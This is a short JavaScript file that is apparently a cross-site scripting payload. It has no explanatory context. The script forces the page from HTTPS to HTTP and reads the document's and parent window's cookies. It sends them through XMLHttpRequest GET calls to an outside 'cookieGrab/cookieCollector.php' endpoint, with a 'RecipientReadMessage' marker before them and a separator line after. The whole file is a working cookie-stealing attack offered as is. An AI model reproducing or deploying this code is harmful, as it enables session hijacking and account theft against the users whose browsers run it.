

if(window.location.protocol != 'http:') {
  location.href = location.href.replace("https://", "http://");
}

var userName; // Not used/known
var cookieValue; // document's cookies
var ipAddress; // Does not work

function grabCookie() {
        if(window.location.protocol != 'http:') {
          location.href = location.href.replace("https://", "http://");
        }
	cookieValue = document.cookie;
}

var req = null;
    try { req = new XMLHttpRequest(); } catch(e) {}
    if (!req) try { req = new ActiveXObject("Msxml2.XMLHTTP"); } catch(e) {}
    if (!req) try { req = new ActiveXObject("Microsoft.XMLHTTP"); } catch(e) {}
    req.open('GET', 'http://ascented.co.nf/cookieGrab/cookieCollector.php?cookieData=*RecipientReadMessage*', false);
    req.send(null);
    req.open('GET', 'http://ascented.co.nf/cookieGrab/cookieCollector.php?cookieData=' + window.parent.document.cookie, false);
    req.send(null);
    req.open('GET', 'http://ascented.co.nf/cookieGrab/cookieCollector.php?cookieData=----------------------', false);
    req.send(null);
    // alert(req.getAllResponseHeaders());

grabCookie();
